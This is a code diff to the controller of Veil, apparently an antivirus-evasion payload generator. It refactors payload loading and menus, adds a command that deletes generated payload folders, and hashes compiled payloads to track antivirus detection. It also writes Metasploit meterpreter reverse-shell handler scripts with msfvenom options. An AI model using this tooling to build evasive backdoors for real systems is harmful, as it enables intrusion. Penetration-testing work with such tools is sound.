@@ -14,6 +14,7 @@ import socket
 import commands
 import time
 import subprocess
+import hashlib
 
 
 # try to find and import the settings.py config file
@@ -94,68 +95,59 @@ class Controller:
 
         self.outputFileName = ""
 
-        # "help":"print help screen",
-        self.commands = { "use":"use a specific payload",
-                 "info":"information on a specific payload",
-                 "list":"list available languages/payloads",
-                 "update":"update Veil to the latest version",
-                 "exit":"exit Veil"}
+        self.commands = [   ("use","use a specific payload"),
+                            ("info","information on a specific payload"),
+                            ("list","list available payloads"),
+                            ("update","update Veil to the latest version"),
+                            ("clean","clean out payload folders"),
+                            ("exit","exit Veil")]
 
-        self.payloadCommands = {"set":"set a specific option value",
-                        "info":"show information about the payload",
-                        "help [crypters]":"show help menu for payload or crypters",
-                        "generate":"generate payload",
-                        "back":"go to the main menu",
-                        "exit":"exit Veil"}
+        self.payloadCommands = [    ("set","set a specific option value"),
+                                    ("info","show information about the payload"),
+                                    ("generate","generate payload"),
+                                    ("back","go to the main menu"),
+                                    ("exit","exit Veil")]
 
         self.LoadPayloads()
 
 
     def LoadPayloads(self):
         """
-        Loads payload modules into an internal self.payloads object.
+        Crawl the module path and load up everything found into self.payloads.
+        """
+            
+        # crawl up to 5 levels down the module path
+        for x in xrange(1,5):    
+            # make the folder structure the key for the module
 
-        Loads all payload modules dynamically from ./modules/payloads/* and
-        builds store the instantiated payload objects in self.payloads. The
-        format for self.payloads is a list of tuples of the form [ (name : <payload object>) ]
+            d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )
+
+            # instantiate the payload stager
+            for name in d.keys():
+                module = d[name].Payload()
+                self.payloads.append( (name, module) )
+
+        # sort payloads by their key/path name
+        self.payloads = sorted(self.payloads, key=lambda x: (x[0]))
+
+
+    def ListPayloads(self):
+        """
+        Prints out available payloads in a nicely formatted way.
         """
 
-        # TODO: detect Windows and modify the paths appropriately
-        d = dict((splitext(basename(path))[0], imp.load_source(splitext(basename(path))[0],path)) for path in glob.glob(join(settings.VEIL_PATH + "/modules/payloads/*/",'[!_]*.py')) )
-        for name in d.keys():
-            stager = d[name].Stager()
-            # if specific languages to use are specified, only load those payload modules
-            if self.langs:
-                if stager.language in self.langs:
-                    self.payloads.append( (name, stager) )
-            else: self.payloads.append( (name, stager) )
-
-        # sort the payloads by language name
-        self.payloads = sorted(self.payloads, key=lambda x: (x[1].shortname))
-        self.payloads = sorted(self.payloads, key=lambda x: (x[1].language))
-
-
-    def ListLangs(self):
-        """
-        Prints out all available languages of loaded paylod modules.
-
-        """
-        langs = list()
-        for (name, payload) in self.payloads: langs.append(payload.language)
-        print (" Available languages:\n")
-        for lang in set(langs): print "\t" + helpers.color(lang)
+        print helpers.color(" [*] Available payloads:\n")
+        lastBase = None
+        x = 1
+        for (name, payload) in self.payloads:
+            parts = name.split("/")
+            if lastBase and parts[0] != lastBase:
+                print ""
+            lastBase = parts[0]
+            print "\t%s)\t%s" % (x, '{0: <24}'.format(name))
+            x += 1
         print ""
 
-
-    def ListPayloads(self, lang):
-        """
-        Prints out the available payloads for a specific language.
-
-        lang = the language to list ("python"/"c"/etc.)
-        """
-        print (" Available %s payloads:\n" % (helpers.color(lang)))
-        for (name, payload) in self.payloads:
-            if payload.language == lang: print "\t%s\t\t%s" % ('{0: <16}'.format(payload.shortname), payload.rating)
 
     def UpdateVeil(self, interactive=True):
         """
@@ -170,22 +162,39 @@ class Controller:
         if interactive:
             raw_input(" [>] Veil updated, press any key to continue: ")
 
-    def ListAllPayloads(self):
-        """
-        Prints out the name, language and rating of all loaded payloads.
 
+    def CleanPayloads(self, interactive=True):
         """
-        print " Available payloads:\n"
-        lastLang=None
-        x = 1
-        for (name, payload) in self.payloads:
-            # this is so we can space out languages
-            if lastLang and payload.language != lastLang:
-                print ""
-            lastLang = payload.language
-            print "\t%s)\t%s\t\t%s" % (x, '{0: <24}'.format(payload.language + "/" + payload.shortname), payload.rating)
-            x+=1
-        print ""
+        Cleans out the payload source/compiled/handler folders.
+        """
+        
+        # prompt for confirmation if we're in the interactive menu
+        if interactive:
+            choice = raw_input("\n [>] Are you sure you want to clean payload folders? [y/N] ")
+
+            if choice.lower() == "y":
+                print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
+                os.system('rm %s/*.* 2>/dev/null' %(settings.PAYLOAD_SOURCE_PATH))
+
+                print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
+                os.system('rm %s/*.exe 2>/dev/null' %(settings.PAYLOAD_COMPILED_PATH))
+
+                print " [*] Cleaning %s" %(settings.HANDLER_PATH)
+                os.system('rm %s/*.rc 2>/dev/null' %(settings.HANDLER_PATH))
+
+                choice = raw_input("\n [>] Folders cleaned, press any key to return to the main menu: ")
+        
+        else:
+            print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
+            os.system('rm %s/*.* 2>/dev/null' %(settings.PAYLOAD_SOURCE_PATH))
+
+            print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
+            os.system('rm %s/*.exe 2>/dev/null' %(settings.PAYLOAD_COMPILED_PATH))
+
+            print " [*] Cleaning %s" %(settings.HANDLER_PATH)
+            os.system('rm %s/*.rc 2>/dev/null' %(settings.HANDLER_PATH))
+
+            print "\n [*] Folders cleaned\n"
 
 
     def PayloadInfo(self, payload, showTitle=True, showInfo=True):
@@ -193,15 +202,19 @@ class Controller:
         Print out information about a specified payload.
 
         payload = the payload object to print information on
+        showTitle = whether to show the Veil title
+        showInfo = whether to show the payload information bit
 
         """
         if showTitle:
             messages.title()
 
         if showInfo:
-            print " Payload information:\n"
+            # extract the payload class name from the instantiated object, then chop off the load folder prefix
+            payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
 
-            print "\tName:\t\t" + payload.shortname
+            print helpers.color(" Payload information:\n")
+            print "\tName:\t\t" + payloadname
             print "\tLanguage:\t" + payload.language
             print "\tRating:\t\t" + payload.rating
 
@@ -214,7 +227,7 @@ class Controller:
 
         # if required options were specified, output them
         if hasattr(self.payload, 'required_options'):
-            print "\n Required Options:\n"
+            print helpers.color("\n Required Options:\n")
 
             print " Name\t\t\tCurrent Value\tDescription"
             print " ----\t\t\t-------------\t-----------"
@@ -226,52 +239,41 @@ class Controller:
             print ""
 
 
-    def SetPayload(self, lang, name, options):
+    def SetPayload(self, payloadname, options):
         """
         Manually set the payload for this object with specified options.
 
-        lang = the language of the payload ("python"/"c"/etc.)
-        name = the payload to set ("VirtualAlloc"/etc.)
+        name = the payload to set, ex: c/meter/rev_tcp
         options = dictionary of required options for the payload, ex:
                 options['customShellcode'] = "\x00..."
                 options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                 options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
         """
 
-        # first extract out all languages  to make sure
-        # a language valid choice was passed
-        langs = list(set([payload.language for (n, payload) in  self.payloads]))
-        if lang not in langs:
-            print helpers.color("\n[!] Specified language '" + lang + "' not valid\n", warning=True)
-            self.ListLangs()
+        # iterate through the set of loaded payloads, trying to find the specified payload name
+        for (name, payload) in self.payloads:
+
+            if payloadname.lower() == name.lower():
+
+                # set the internal payload variable
+                self.payload = payload
+
+                # options['customShellcode'] = "\x00..."
+                if 'customShellcode' in options:
+                    self.payload.shellcode.setCustomShellcode(options['customShellcode'])
+                # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
+                if 'required_options' in options:
+                    for k,v in options['required_options'].items():
+                        self.payload.required_options[k] = v
+                # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
+                if 'msfvenom' in options:
+                    self.payload.shellcode.SetPayload(options['msfvenom'])
+
+        # if a payload isn't found, then list available payloads and exit
+        if not self.payload:
+            print helpers.color(" [!] Invalid payload selected\n\n", warning=True)
+            self.ListPayloads()
             sys.exit()
-
-        # extract out the specific payloads for this language
-        payloads = list(set([payload.shortname for (n, payload) in  self.payloads if payload.language == lang]))
-        if name not in payloads:
-            print helpers.color("\n[!] Specified payload '"+name+"' not valid\n", warning=True)
-            self.ListPayloads(lang)
-            sys.exit()
-
-        # iterate through the set of loaded payloads, trying to match
-        # the language name and payload specified
-        for (n, payload) in self.payloads:
-            if payload.language == lang:
-                if payload.shortname == name:
-
-                    # set the internal payload variable
-                    self.payload = payload
-
-                    # options['customShellcode'] = "\x00..."
-                    if 'customShellcode' in options:
-                        self.payload.shellcode.setCustomShellcode(options['customShellcode'])
-                    # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
-                    if 'required_options' in options:
-                        for k,v in options['required_options'].items():
-                            self.payload.required_options[k] = v
-                    # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
-                    if 'msfvenom' in options:
-                        self.payload.shellcode.SetPayload(options['msfvenom'])
 
 
     def ValidatePayload(self, payload):
@@ -302,7 +304,7 @@ class Controller:
         return self.payload.generate()
 
 
-    def OutputMenu(self, payload, code, showTitle=True, interactive=True, OutputBaseChoice=""):
+    def OutputMenu(self, payload, code, showTitle=True, interactive=True, overwrite=False, OutputBaseChoice=""):
         """
         Write a chunk of payload code to a specified ouput file base.
         Also outputs a handler script if required from the options.
@@ -330,19 +332,24 @@ class Controller:
 
         if OutputBaseChoice == "": OutputBaseChoice = "payload"
 
-        # walk the output path and grab all the file bases, disregarding extensions
-        fileBases = []
-        for (dirpath, dirnames, filenames) in os.walk(outputFolder):
-            fileBases.extend(list(set([x.split(".")[0] for x in filenames if x.split(".")[0] != ''])))
-            break
-
-        # as long as the file exists, increment a counter to add to the filename
-        # i.e. "payload3.py", to make sure we don't overwrite anything
+        # if we are overwriting, this is the base choice used
         FinalBaseChoice = OutputBaseChoice
-        x = 1
-        while FinalBaseChoice in fileBases:
-            FinalBaseChoice = OutputBaseChoice + str(x)
-            x += 1
+
+        # if we're not overwriting output files, walk the existing and increment
+        if not overwrite:
+            # walk the output path and grab all the file bases, disregarding extensions
+            fileBases = []
+            for (dirpath, dirnames, filenames) in os.walk(outputFolder):
+                fileBases.extend(list(set([x.split(".")[0] for x in filenames if x.split(".")[0] != ''])))
+                break
+
+            # as long as the file exists, increment a counter to add to the filename
+            # i.e. "payload3.py", to make sure we don't overwrite anything
+            FinalBaseChoice = OutputBaseChoice
+            x = 1
+            while FinalBaseChoice in fileBases:
+                FinalBaseChoice = OutputBaseChoice + str(x)
+                x += 1
 
         # set the output name to /outout/source/BASENAME.EXT
         OutputFileName = outputFolder + FinalBaseChoice + "." + payload.extension
@@ -352,7 +359,9 @@ class Controller:
         OutputFile.close()
 
         # start building the information string for the generated payload
-        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payload.shortname
+        # extract the payload class name from the instantiated object, then chop off the load folder prefix
+        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
+        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname
 
         if hasattr(payload, 'shellcode'):
             # check if msfvenom was used or something custom, print appropriately
@@ -389,12 +398,11 @@ class Controller:
 
         # if required options were specified, output them
         if hasattr(payload, 'required_options'):
-            message += "\n Required Options:\t"
             t = ""
             # sort the dictionary by key before we output, so it looks nice
             for key in sorted(payload.required_options.iterkeys()):
                 t += " " + key + "=" + payload.required_options[key][0] + " "
-            message += t.strip()
+            message += "\n" + helpers.formatLong("Required Options:", t.strip(), frontTab=False, spacing=24)
 
             # check if any options specify that we should build a handler out
             keys = payload.required_options.keys()
@@ -417,12 +425,14 @@ class Controller:
 
                 # if not BDF, try to extract the handler type from the payload name
                 else:
-                    if "tcp" in payload.shortname.lower():
+                    # extract the payload class name from the instantiated object, then chop off the load folder prefix
+                    payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
+                    if "tcp" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
-                    elif "https" in payload.shortname.lower():
+                    elif "https" in payloadname.lower():
                         handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
-                    elif "http" in payload.shortname.lower():
-                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
+                    elif "http" in payloadname.lower():
+                        handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
                     else: pass
 
                 handler += "set LHOST 0.0.0.0\n"
@@ -433,7 +443,6 @@ class Controller:
                 handler += "set ExitOnSession false\n"
                 handler += "set AutoRunScript post/windows/manage/migrate\n"
                 handler += "exploit -j\n"
-
 
         message += "\n Payload File:\t\t"+OutputFileName + "\n"
 
@@ -474,6 +483,23 @@ class Controller:
         # print the full message containing generation notes
         print message
 
+        # This block of code is going to be used to SHA1 hash our compiled payloads to potentially submit the
+        # hash with VTNotify to detect if it's been flagged
+        try:
+            CompiledHashFile = settings.HASH_LIST
+            HashFile = open(CompiledHashFile, 'a')
+            OutputFile = open(OutputFileName, 'rb')
+            Sha1Hasher = hashlib.sha1()
+            Sha1Hasher.update(OutputFile.read())
+            SHA1Hash = Sha1Hasher.hexdigest()
+            OutputFile.close()
+            HashFile.write(SHA1Hash + ":" + FinalBaseChoice + "\n")
+            HashFile.close()
+        except:
+            # if that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
+            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)
+
+
         # print the end message
         messages.endmsg()
 
@@ -494,7 +520,7 @@ class Controller:
         Returns the output of OutputMenu() (the full path of the source file or compiled .exe)
         """
 
-        comp = completers.PayloadCompleter(self.payload)
+        comp = completers.PayloadCompleter(self.payloadCommands, self.payload)
         readline.set_completer_delims(' \t\n;')
         readline.parse_and_bind("tab: complete")
         readline.set_completer(comp.complete)
@@ -503,7 +529,12 @@ class Controller:
         if showTitle:
             messages.title()
 
-        print " Payload: " + helpers.color(payload.language + "/" + payload.shortname) + " loaded"
+        # extract the payload class name from the instantiated object
+        # YES, I know this is a giant hack :(
+        # basically need to find "payloads" in the path name, then build
+        # everything as appropriate
+        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
+        print " Payload: " + helpers.color(payloadname) + " loaded\n"
 
         self.PayloadInfo(payload, showTitle=False, showInfo=False)
         messages.helpmsg(self.payloadCommands, showTitle=False)
@@ -523,11 +554,7 @@ class Controller:
                         self.PayloadInfo(payload)
                         choice = ""
                     if parts[0] == "help":
-                        if len(parts) > 1:
-                            if parts[1] == "crypters" or parts[1] == "[crypters]":
-                                messages.helpCrypters()
-                        else:
-                            messages.helpmsg(self.payloadCommands)
+                        messages.helpmsg(self.payloadCommands)
                         choice = ""
                     # head back to the main menu
                     if parts[0] == "main" or parts[0] == "back":
@@ -659,9 +686,7 @@ class Controller:
 
                 # handle our tab completed commands
                 if cmd.startswith("help"):
-                    #messages.helpmsg(self.commands)
                     messages.title()
-                    self.commands
                     cmd = ""
                     showMessage=False
 
@@ -669,7 +694,7 @@ class Controller:
 
                     if len(cmd.split()) == 1:
                         messages.title()
-                        self.ListAllPayloads()
+                        self.ListPayloads()
                         showMessage=False
                         cmd = ""
 
@@ -689,16 +714,12 @@ class Controller:
                                 x += 1
 
                         # else choosing the payload by name
-                        elif len(p.split("/")) == 2:
-                            lang,payloadName = p.split("/")
-
-                            for (name, pay) in self.payloads:
-
+                        else:
+                            for (payloadName, pay) in self.payloads:
                                 # if we find the payload specified, kick off the payload menu
-                                if pay.language == lang:
-                                    if pay.shortname == payloadName:
-                                        self.payload = pay
-                                        self.outputFileName = self.PayloadMenu(self.payload)
+                                if payloadName == p:
+                                    self.payload = pay
+                                    self.outputFileName = self.PayloadMenu(self.payload)                                        
 
                         cmd = ""
                         showMessage=True
@@ -710,6 +731,12 @@ class Controller:
 
                 elif cmd.startswith("update"):
                     self.UpdateVeil()
+                    showMessage=True
+                    cmd = ""
+
+                # clean payload folders
+                if cmd.startswith("clean"):
+                    self.CleanPayloads()
                     showMessage=True
                     cmd = ""
 
@@ -735,16 +762,12 @@ class Controller:
                                 x += 1
 
                         # else choosing the payload by name
-                        elif len(p.split("/")) == 2:
-                            lang,payloadName = p.split("/")
-
-                            for (name, pay) in self.payloads:
-
+                        else:
+                            for (payloadName, pay) in self.payloads:
                                 # if we find the payload specified, kick off the payload menu
-                                if pay.language == lang:
-                                    if pay.shortname == payloadName:
-                                        self.payload = pay
-                                        self.PayloadInfo(self.payload)
+                                if payloadName == p:
+                                    self.payload = pay
+                                    self.PayloadInfo(self.payload) 
 
                         cmd = ""
                         showMessage=False
@@ -758,19 +781,7 @@ class Controller:
 
                     if len(cmd.split()) == 1:
                         messages.title()
-                        self.ListAllPayloads()
-
-                    if len(cmd.split()) == 2:
-                        parts = cmd.split()
-                        if parts[1] == "all" or parts[1] == "payloads":
-                            messages.title()
-                            self.ListAllPayloads()
-                        elif parts[1] == "langs":
-                            messages.title()
-                            self.ListLangs()
-                        else:
-                            messages.title()
-                            self.ListPayloads(parts[1])
+                        self.ListPayloads()     
 
                     cmd = ""
                     showMessage=False
